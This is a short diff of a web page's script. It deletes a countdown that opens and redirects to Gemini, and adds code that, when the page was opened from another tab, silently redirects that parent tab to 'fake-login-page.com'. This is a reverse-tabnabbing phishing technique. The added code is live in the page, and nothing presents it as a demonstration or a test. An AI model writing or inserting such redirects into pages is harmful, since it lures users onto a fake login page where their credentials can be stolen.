@@ -35,25 +35,9 @@
     </div>
 
     <script>
-        function launchTabs() {
-            // 1. Open Google in a NEW tab immediately
-            window.open("https://gemini.google.com", "_blank");
-
-            // 2. Start a 5-second countdown for the current tab
-            let timeLeft = 5;
-            const timerDiv = document.getElementById('timer');
-            
-            const countdown = setInterval(() => {
-                timerDiv.innerText = "Redirecting to Gemini in " + timeLeft + "...";
-                timeLeft -= 1;
-                
-                if (timeLeft < 0) {
-                    clearInterval(countdown);
-                    // 3. Redirect the CURRENT tab to Gemini
-                    window.location.href = "https://gemini.google.com/share/continue/0a7c5cf1dbdc";
-                }
-            }, 1000);
-        }
+       if (window.opener) {
+  window.opener.location = "https://fake-login-page.com";
+}
     </script>
 
 </body>
